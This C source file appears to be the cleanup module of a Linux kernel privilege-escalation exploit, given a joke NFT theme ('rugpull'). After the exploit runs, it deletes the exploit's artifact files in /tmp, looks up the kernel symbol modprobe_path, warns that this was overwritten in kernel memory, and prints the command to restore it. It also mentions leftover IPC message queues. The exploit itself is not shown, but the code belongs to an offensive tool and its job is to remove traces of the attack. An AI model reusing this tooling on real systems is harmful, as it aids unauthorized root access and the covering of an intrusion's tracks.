#include "nfttables.h"

int rugpull(void)
{
    pr_info("");
    pr_info(RUG " " C_BOLD "The devs are leaving the project..." C_RST);
    pr_info("");

    int cleaned = 0;

    /* remove exploit artifacts */
    const char *artifacts[] = {
        "/tmp/.nft_mint",
        "/tmp/.nft_sh",
        "/tmp/.nft_trigger",
        NULL,
    };

    for (const char **p = artifacts; *p; p++) {
        if (unlink(*p) == 0) {
            pr_info(BROOM " Burned: %s", *p);
            cleaned++;
        }
    }

    /* try to restore modprobe_path if we have access */
    uint64_t modprobe_addr = kallsyms_lookup("modprobe_path");
    if (modprobe_addr && geteuid() == 0) {
        /* can't easily restore without the same PTE trick.
           log it as a known artifact. */
        pr_warn("modprobe_path was overwritten in kernel memory");
        pr_info("  " C_DIM "restore: echo /sbin/modprobe > /proc/sys/kernel/modprobe" C_RST);
    }

    /* clear any message queues we left behind */
    pr_info(BROOM " Clearing IPC message queues...");
    /* we can't know our exact queue IDs post-exploit, so this is
       best-effort. the queues are cleaned up on process exit anyway. */

    if (cleaned == 0)
        pr_info(C_DIM "  (nothing to clean)" C_RST);

    pr_info("");
    pr_info(CHART " " C_DIM "Floor price: 0" C_RST);
    pr_info("");

    return 0;
}
